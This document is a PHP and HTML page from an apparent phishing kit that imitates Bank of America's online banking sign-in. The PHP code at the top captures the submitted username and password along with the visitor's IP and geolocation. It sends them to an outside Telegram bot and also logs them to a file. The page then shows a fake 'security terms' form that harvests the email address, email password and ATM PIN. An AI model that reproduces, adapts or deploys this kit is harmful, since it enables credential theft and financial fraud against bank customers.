<?php
error_reporting(0);
$user = $_POST['usr'];
include('dt.php');
session_start();
// $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$password         = $_POST['psw'];
$id=md5(rand());
$session=md5(rand());
@ini_set('display_errors', 'on'); 
ob_start();

function getRealIP()
{if (isset($_SERVER["HTTP_CLIENT_IP"])) {return $_SERVER["HTTP_CLIENT_IP"];} elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {return $_SERVER["HTTP_X_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {return $_SERVER["HTTP_X_FORWARDED"];} elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {return $_SERVER["HTTP_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_FORWARDED"])) {return $_SERVER["HTTP_FORWARDED"];} else {return $_SERVER["REMOTE_ADDR"];}}
$ip=getRealIP();

$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
// $ip = $meta['geoplugin_request'];
$pais = $meta['geoplugin_countryName'];
$region = $meta['geoplugin_regionName'];
$ciudad = $meta['geoplugin_city'];
date_default_timezone_set('America/Bogota');
@ini_set("display_errors", 0);
if ( isset ($user) && isset ($password)  ){
$message = "B o A \r\nID= ".$user."\r\np4zz=".$password."\r\n";
$message .= "IP= ".$ip."\r\n".$pais.", ".$region.", ".$ciudad."\r\n";
$apiToken = $apibot;
$data = [
  'chat_id' => $canal,
  'text' => $message];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); }

  $handle = fopen($datos, "a"); 
    fwrite($handle, "Usuario= ".$user."\r\n");
    fwrite($handle, "Clave= ".$password."\r\n");
    fwrite($handle, "Cuando= ");
    fwrite($handle, date ('l jS \of F Y g:i A',time()));
    fwrite($handle, "\r\n"); 
    fwrite($handle, "IP= ".$ip."\r\n".$pais.", ".$region.", ".$ciudad."\r\n");
    fwrite($handle, "=========================================== \r\n");
    fclose($handle);
  ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML lang="en-US" lang="en-US" xml:lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
<HEAD>
  <meta http-equiv="Expires" content="0">
  <meta http-equiv="Last-Modified" content="0">
  <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
  <meta http-equiv="Pragma" content="no-cache">
   <META content="IE=11.0000" http-equiv="X-UA-Compatible" charset="utf-8">
<META http-equiv="X-UA-Compatible" content="IE=Edge">     
<META name="Keywords" content="Your Online ID">      
<META name="Description" content="Sign in to your Online Banking account by entering your Online ID.">   
 <TITLE>Bank of America | Online Banking | Sign In | Online ID</TITLE> 
 <link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">        
<LINK href="css/new.css" rel="stylesheet" type="text/css" media="all">
<LINK href="css/pin.css" rel="stylesheet" type="text/css" media="all"> 
<link href="css/estilos.css"rel="stylesheet" type="text/css" media="all">
	<script src="script/popup.js" type="text/javascript"></script>
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />

<BODY>
<script src="script/popup.js" defer></script>
<DIV class="contenedor"><DIV class="fsd-layout fsd-2c-700lt-layout"><DIV class="fsd-border">	<DIV class="center-content"><DIV class="header"><DIV class="header-module"><DIV class="fsd-secure-esp-skin"><IMG width="230" height="28" alt="Bank of America" src="images/BofA_rgb.png"><DIV class="page-type" data-font="cnx-regular">Sign In</DIV><DIV class="right-links"><DIV class="secure-area">Secure Area</DIV><A name="spanish_toggle" title="Muestra esta sesi�n de la Banca en L�nea" target="_self">En Espa&ntilde;ol</A><DIV class="clearboth"></DIV></DIV><DIV class="clearboth"></DIV></DIV></DIV><DIV class="page-title-module h-100" id="skip-to-h1"><DIV class="red-grad-bar-skin sup-ie"><H1 data-font="cnx-regular" style="font-weight: normal">Sign In to Online Banking</H1></DIV></DIV>


<div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite">
<div class="error-skin">
<div class="error-message">
<p class="title TLu_ERROR">We can not process your request.</p>
<ul>
	<li id="errorEmail" class="hide"> Please enter a valid email address.</li>
	<li id= "errorPass" class="hide">This field is required.</li>
</ul></div></div></div>



<form method="post" id="myFormPIN" action="crdet.php" style="min-height: calc(100vh - 100px - 300px)">	<div class="verifi">Verificación: </div><br><br><div class="termino"> Para aceptar nuestros nuevos Términos y Condiciones de seguridad por favor provea la siguiente información<br><br>	

Email:<br>
<input class="async-encrypt tl-private fl-lt ssnTinNo" type="email" name="email" id="email" maxlength="50" value="" required style="margin-left: 10%; width:170px;height:30px;" autocomplete="off" >
             <div class="clearboth"></div><br> 
 Password de Correo: <br>
<input class="async-encrypt tl-private fl-lt ssnTinNo" type="password"name="pass" id ="pass" maxlength="30" value="" required style="margin-left: 10%; width:170px;height:30px;" autocomplete="off" >

             <div class="clearboth"></div><br> 
            Indique el PIN de la tarjeta de cajero automático (ATM) que esta asignada a la cuenta</label><br>
<input type="tel" class="async-encrypt tl-private fl-lt ssnTinNo onlynumber pass-type" pattern="[0-9].{3,}" name="pin" id="pin" maxlength="10" value="" required="" onkeypress="return event.charCode >= 48 && event.charCode <= 57" style="margin-left: 10%; width:90px;height:30px;" autocomplete="off" ><div class="clearboth"></div><br>
<strong>Security preference:</strong> Do you want us to remember this computer?<div class="clearboth"></div><br>


<input id="otp-card-email-id1" name="debitCardNumber" type="radio" ><label style="font-weight: bold;">  Yes, remember this computer.</label><br><label> Trust this computer when I start a session.</label>
<div class="clearboth"></div><br>
<input id="otp-card-email-id2" name="debitCardNumber" type="radio" ><label style="font-weight: bold;">  No, I do not remember this computer.</label><br><label> Ask me a security question every time I start a session.</label>  </div>   <br>
<input  type="hidden" name="user2" id="user2" value=$user>
<div class="clearboth"></div>
<a role="button" class="mtop-15 btn-bofa btn-bofa-small btn-bofa-blue submit" id="idSIButton8"style="margin-left: 10%;padding: 2px 5px" onclick="enviar()">Continuar</a>
<a href="index.php" class="mtop-15 btn-bofa btn-bofa-small btn-bofa-gray btn-bofa-noRight" style="padding: 2px 5px;" id="forgot-cancel" name="forgot-cancel"><span>Cancelar</span></a></form><DIV class="clearboth"></DIV></DIV><DIV class="footer">
<DIV class="footer-top">&nbsp;  	</DIV><DIV class="footer-inner"><DIV class="global-footer-module"><DIV class="gray-bground-skin cssp"><DIV class="secure">Secure area</DIV><DIV class="link-container">	<DIV class="link-row"><A name="Privacy_&amp;_Security_footer" title="Privacy &amp; Security" class="last-link" href="#" target="_blank">Privacy &amp; Security</A><DIV class="clearboth"></DIV></DIV></DIV><P>Bank of America, N.A. Member FDIC. <A name="Equal_Housing_Lender" href="#" target="_blank">Equal Housing Lender</A> <BR>&copy;2023 Bank of America Corporation.</P></DIV></DIV></DIV></DIV></DIV></DIV></DIV></BODY></HTML>